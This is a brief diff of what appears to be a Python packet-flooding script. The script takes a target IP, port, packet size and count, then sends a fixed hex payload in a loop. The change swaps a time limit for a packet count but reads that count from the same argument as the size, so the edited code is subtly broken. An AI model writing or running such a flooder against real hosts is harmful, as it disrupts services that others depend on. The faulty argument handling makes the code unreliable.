@@ -12,8 +12,7 @@ if len(sys.argv) < 4:
 ip = sys.argv[1]
 port = int(sys.argv[2])
 size = int(sys.argv[3])
-t1m3 = int(sys.argv[4])
-timeout = time.time() + t1m3
+packets = int(sys.argv[3])
 sent = 0
 data = 'f1a525da11f6'.decode('hex')
 while True:
